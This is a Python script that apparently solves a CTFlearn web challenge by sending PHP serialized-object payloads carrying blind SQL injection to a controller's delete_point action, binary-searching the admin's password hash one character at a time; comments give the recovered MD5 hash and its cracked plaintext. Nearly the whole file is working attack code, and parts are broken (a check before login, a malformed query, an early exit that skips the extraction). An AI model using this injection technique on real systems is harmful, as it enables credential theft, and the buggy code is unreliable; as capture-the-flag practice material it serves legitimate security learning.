import requests
import urllib
import re


uname="writeup"
passw="writeup"

url_base = "http://web.ctflearn.com/grid/controller.php"
url_login= url_base+"?action=login"
url_debug= url_base+"?action=debug"
url_delete= url_base+"?action=delete_point&point="
url_addpoint = url_base+"?action=add_point"

payload_base = 'O:5:"point":1:{s:2:"ID";'
init_array = []

def isLogged():
	debug = requests.get(url_debug, cookies=sessid);
	i = debug.text().find("[user]")
	return False if i==-1 else True

def createPayload( str ):
	return payload_base + 's:{}:"{}";}};'.format(len(str), str)

def sendPayload ( str ):
	print ("exec: WHERE ID= {}".format(str))
	payload = createPayload(str)
	delete = requests.get(url_delete+payload, cookies=sessid)
	return findIDs(delete.text)

def logIn():
	global sessid
	print "loggin in: ", uname+":"+passw
	login_info = {'uname': uname, 'pass': passw}
	login = requests.post(url_login, data=login_info, allow_redirects=False)
	sessid = login.cookies.copy()
	return

def findIDs(text):
	regex = re.compile(r"ID:\s(\d{6})")
	matches = regex.findall(text)
	return matches

def addPoints():
	print("Adding points: ")
	for x in range(1, 20):
		point = {'x': 250, 'y': 25*x}
		requests.post(url_addpoint, data=point, cookies=sessid, allow_redirects=False)
	return


def tryPayload(str):
	global init_array
	if(len(init_array) <= 1):
		addPoints()
		init_array = sendPayload("1")
	oldLen = len(init_array)
	init_array = sendPayload(str)
	return oldLen != len(init_array)

def isDigit(offset):
	return tryPayload("{} and substring((Select password from user where username='admin' limit 0,1),{},1)<='9'".format(init_array[0], offset));

#bin-search [start, end]
def find(offset, start, end):
	a = ord(start)
	b = ord(end)
	while (a < b):
		mid = (a+b)//2
		if tryPayload("{} and Ascii(substring((Select password from user where username='admin' limit 0,1),{},1))>{}".format(init_array[0], offset, mid)):
			a = mid + 1
		else:
			b = mid
	return chr(a)




if isLogged():
	print("Sucessfully logged in")
else:
	exit("Unsuccessful login!")



logIn()

init_array = sendPayload("1");
print len(init_array)
print len(sendPayload("{} AND length(SELECT table_name FROM information_schema.tables WHERE tables.schema = database()"==4));
exit(0);



init_array = sendPayload("1")

result = ""

for offset in range(1, 33):
	if isDigit(offset):
		result += find(offset, '0', '9')
	else:
		result += find(offset, 'a', 'z')
	print(result)



# tables in DB: user (username, password), point
# abcdefghijklmnopqrstuvwxyz

# hash MD5 of 'hello': 5d41402abc4b2a76b9719d911017c592
# hash MD5 of admin's password: 0c2c99a4ad05d39177c30b30531b119b
# cracking admin's password = grapevine

# print len(sendPayload("{} and substring((Select password from user where username='hello' limit 0,1),1,100)='5d41402abc4b2a76b9719d911017c592'".format(init[0]))) --> true





